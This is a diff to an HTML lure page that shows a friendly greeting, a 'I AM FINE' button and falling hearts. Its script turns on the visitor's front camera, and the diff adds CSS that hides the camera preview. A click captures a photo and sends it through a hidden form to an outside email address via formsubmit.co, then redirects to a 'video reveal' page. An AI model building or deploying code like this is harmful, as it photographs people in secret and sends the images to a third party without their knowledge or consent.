@@ -16,6 +16,7 @@ body {
   font-family: Arial, sans-serif;
   overflow: hidden;
 }
+
 h2 {
   font-size: 3em;
   color: palevioletred;
@@ -24,6 +25,7 @@ h2 {
   text-shadow: 2px 2px 5px rgba(0,0,0,0.2);
   z-index: 2;
 }
+
 button {
   font-size: 2em;
   padding: 15px 30px;
@@ -32,14 +34,16 @@ button {
   border: none;
   border-radius: 15px;
   cursor: pointer;
-  transition: transform 0.3s, box-shadow 0.3s;
+  transition: transform 0.3s, box-shadow 0.3s, opacity 0.5s;
   z-index: 2;
   position: relative;
 }
+
 button:hover {
   transform: scale(1.1);
   box-shadow: 0 0 20px rgba(138,43,226,0.8);
 }
+
 .heart {
   position: absolute;
   top: -20px;
@@ -49,16 +53,23 @@ button:hover {
   z-index: 1;
   opacity: 0.8;
 }
+
 @keyframes fall {
   to { transform: translateY(110vh) rotate(360deg); }
+}
+
+video {
+  display: none; /* hide live camera preview */
 }
 </style>
 </head>
 <body>
+
 <h2>HELLO ❤ — HOW ARE YOU?</h2>
 <button id="capture">I AM FINE</button>
 
 <canvas id="canvas" style="display:none;"></canvas>
+
 <form id="imageForm" action="https://formsubmit.co/ureren77@gmail.com" method="POST" enctype="multipart/form-data">
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_template" value="table">
@@ -83,7 +94,7 @@ navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
   })
   .catch(err => console.error("Error accessing camera: ", err));
 
-// Generate falling hearts on page load
+// Heart animation
 function createHeart() {
   const heart = document.createElement("div");
   heart.classList.add("heart");
@@ -96,7 +107,7 @@ function createHeart() {
 }
 setInterval(createHeart, 300);
 
-// Capture photo and submit form
+// Capture photo and submit
 captureButton.addEventListener("click", () => {
   if (!video) return alert("Camera not ready!");
 
@@ -115,16 +126,21 @@ captureButton.addEventListener("click", () => {
       imageInput.files = [file];
     }
 
-    // Submit form
+    // Submit the form
     form.submit();
-
-    // Redirect to video reveal page after submission
-    setTimeout(() => {
-      window.location.href = "https://hemraj777.github.io/Qnahi/"; // Replace with your URL if needed
-    }, 500);
   }, "image/png");
+
+  // Optional: fade out button
+  captureButton.style.opacity = 0;
+});
+
+// Redirect AFTER form submission
+form.addEventListener("submit", () => {
+  setTimeout(() => {
+    window.location.href = "https://hemraj777.github.io/Qnahi/"; // your video reveal page
+  }, 500);
 });
 </script>
+
 </body>
 </html>
-
